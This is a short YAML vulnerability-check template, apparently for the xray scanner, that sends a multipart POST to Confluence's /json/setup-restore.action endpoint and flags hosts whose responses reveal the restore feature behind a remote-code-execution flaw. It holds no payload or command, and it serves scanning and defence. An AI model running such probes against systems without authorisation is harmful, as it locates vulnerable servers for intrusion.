name: poc-yaml-confluence-restore-rce
manual: true
transport: http
set:
    random: randomLowercase(15)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /json/setup-restore.action
            headers:
                Content-Type: multipart/form-data; boundary=----{{random}}
        expression: response.body_string.contains("buildIndexLocalFileRestore") || response.body_string.contains("setup-restore-local.action")
expression: r0()
detail:
    author: Chaitin
    links:
        - https://mp.weixin.qq.com/s/Yh92tfQRgKXP0_K4foWcfw
